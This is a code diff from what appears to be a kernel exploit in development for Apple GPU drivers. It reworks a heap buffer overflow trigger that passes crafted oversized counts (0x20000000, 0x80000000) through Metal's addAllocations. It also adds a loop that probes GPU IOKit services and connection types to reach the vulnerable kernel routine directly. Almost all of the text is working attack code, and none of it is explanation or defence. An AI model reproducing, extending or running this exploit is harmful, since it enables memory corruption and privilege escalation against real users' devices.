@@ -147,26 +147,43 @@ static void trigger_bof(id<MTLDevice> dev) {
         [rset commit];
         evf("added 4 resources (grown beyond inline threshold)");
 
-        /* Step 4: Trigger integer overflow via large count
-         * On 26.3.1: s_group_add_resources receives count unchecked.
-         * Attempt count = 0x40000001 -> count*2 = 0x80000002
-         * As int32: -0x7FFFFFFE -> * element_size = very_negative
-         * kalloc(very_negative) -> exploitable allocation.
+        /* Step 4: Trigger integer overflow via Metal API directly.
+         * Pass arr (64 items) but claim OVERFLOW_COUNT items.
+         * Metal framework may not validate count <= arr length.
+         * If passed through, kernel s_group_add_resources receives
+         * count = OVERFLOW_COUNT with no bounds check (26.3.1).
          *
-         * Note: MTLResidencySet API enforces NSUInteger, but kernel receives
-         * via IOKit struct where count may be truncated to int32_t. */
+         * count=0x20000000: smull(0x20000000, 24)+8 mod 2^32 = 8 bytes alloc
+         * but OVERFLOW_COUNT elements copied -> kernel heap BOF.
+         *
+         * count=0x80000000 (INT32_MIN as int32): smull overflows
+         * to large 64-bit value -> kalloc fails but interesting. */
 
-        /* Try variant 1: large legitimate-looking count (NSUInteger) */
-        /* This tests whether the kernel validates count before computing size */
-        const NSUInteger OVERFLOW_COUNT = 0x40000001ULL;
+        /* Variant A: count chosen so (count*24)&0xFFFFFFFF + 8 = 8 (small alloc) */
+        const NSUInteger OVERFLOW_COUNT_A = 0x20000000ULL;
+        evf("Metal overflow attempt A: addAllocations count=0x%llx",
+            (uint64_t)OVERFLOW_COUNT_A);
+        @try {
+            [rset addAllocations:arr count:OVERFLOW_COUNT_A];
+            evf("Metal overflow A: count accepted by Metal layer!");
+            [rset commit];
+            evf("Metal overflow A: committed to kernel - BOF may have triggered");
+        } @catch (NSException *ex) {
+            evf("Metal overflow A exception: %s", ex.reason.UTF8String);
+        }
 
-        /* We can't actually have 0x40000001 resource objects, but the kernel
-         * might process the count before validating the array length.
-         * Use the existing arr (64 items) but pass overflow_count to the kernel. */
-
-        /* To pass overflow_count to kernel without matching objects,
-         * we'd need direct IOUserClient access. Use indirect path via
-         * MTLCommandEncoder useResources with crafted size. */
+        /* Variant B: INT32_MIN as NSUInteger - tests signed overflow path */
+        const NSUInteger OVERFLOW_COUNT_B = (NSUInteger)(uint32_t)0x80000000U;
+        evf("Metal overflow attempt B: addAllocations count=0x%llx",
+            (uint64_t)OVERFLOW_COUNT_B);
+        @try {
+            [rset addAllocations:arr count:OVERFLOW_COUNT_B];
+            evf("Metal overflow B: count accepted by Metal layer!");
+            [rset commit];
+            evf("Metal overflow B: committed to kernel");
+        } @catch (NSException *ex) {
+            evf("Metal overflow B exception: %s", ex.reason.UTF8String);
+        }
 
     fallback_path:;
         /* Alternate trigger: MTLRenderCommandEncoder useResources */
@@ -240,28 +257,47 @@ extern kern_return_t IOConnectCallMethod(io_connect_t conn, uint32_t sel,
 static void trigger_bof_iokit(void) {
     evf("STARTING direct IOUserClient BOF path");
 
-    /* Find IOGPUFamily UserClient connection */
+    /* Probe multiple GPU service names and connection types */
+    const char *service_names[] = {
+        "IOGPU", "IOGPUDevice", "AGXG18P", "AGXG18X",
+        "AGXSolo", "IOGPUFamily", NULL
+    };
+    const uint32_t conn_types[] = { 0, 1, 2, 3, 0x100, 0x101 };
+
     mach_port_t master = 0;
     IOMasterPort(MACH_PORT_NULL, &master);
 
-    CFMutableDictionaryRef match = IOServiceMatching("IOGPU");
-    io_iterator_t it = 0;
-    IOServiceGetMatchingServices(master, match, &it);
+    io_connect_t conn = 0;
+    kern_return_t open_kr = 0;
 
-    io_service_t svc = IOIteratorNext(it);
-    IOObjectRelease(it);
-
-    if (!svc) {
-        evf("IOGPU service not found (need IOKit entitlement)");
-        return;
+    for (int si = 0; service_names[si] && !conn; si++) {
+        CFMutableDictionaryRef match = IOServiceMatching(service_names[si]);
+        io_iterator_t it = 0;
+        IOServiceGetMatchingServices(master, match, &it);
+        io_service_t svc = IOIteratorNext(it);
+        IOObjectRelease(it);
+        if (!svc) {
+            evf("service '%s': not found", service_names[si]);
+            continue;
+        }
+        evf("service '%s': found port=0x%x", service_names[si], svc);
+        for (int ti = 0; ti < 6 && !conn; ti++) {
+            io_connect_t c = 0;
+            open_kr = IOServiceOpen(svc, mach_task_self(), conn_types[ti], &c);
+            if (open_kr == KERN_SUCCESS) {
+                evf("IOServiceOpen '%s' type=%u: OK conn=0x%x",
+                    service_names[si], conn_types[ti], c);
+                conn = c;
+            } else {
+                evf("IOServiceOpen '%s' type=%u: 0x%x",
+                    service_names[si], conn_types[ti], open_kr);
+            }
+        }
+        IOObjectRelease(svc);
     }
 
-    io_connect_t conn = 0;
-    kern_return_t kr = IOServiceOpen(svc, mach_task_self(), 0, &conn);
-    IOObjectRelease(svc);
-
-    if (kr != KERN_SUCCESS) {
-        evf("IOServiceOpen failed: 0x%x (need GPU sandbox entitlement)", kr);
+    if (!conn) {
+        evf("all service/type probes failed: kr=0x%x", open_kr);
         return;
     }
 
